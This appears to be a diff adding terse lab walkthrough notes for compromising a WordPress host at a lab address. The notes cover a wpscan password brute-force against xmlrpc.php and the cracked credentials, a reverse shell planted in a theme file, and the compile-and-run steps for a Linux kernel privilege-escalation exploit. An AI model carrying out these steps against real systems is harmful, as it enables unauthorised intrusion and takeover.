@@ -1,0 +1,18 @@
+10.11.1.234/xmlrpc.php
+
+Bruteforce xmlrpc whit wpscan:
+
+wpscan --url http://10.11.1.234 -u backup -P rockyou.txt
+backup:backup
+admin:princess
+
+login and copy reverseshell.php in archives.php
+
+uname -a
+Linux core 2.6.32-21-generic-pae
+
+Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - https://www.exploit-db.com/exploits/14814
+
+gcc -o exploit 14814.c
+chmod 777 exploit
+./exploit 
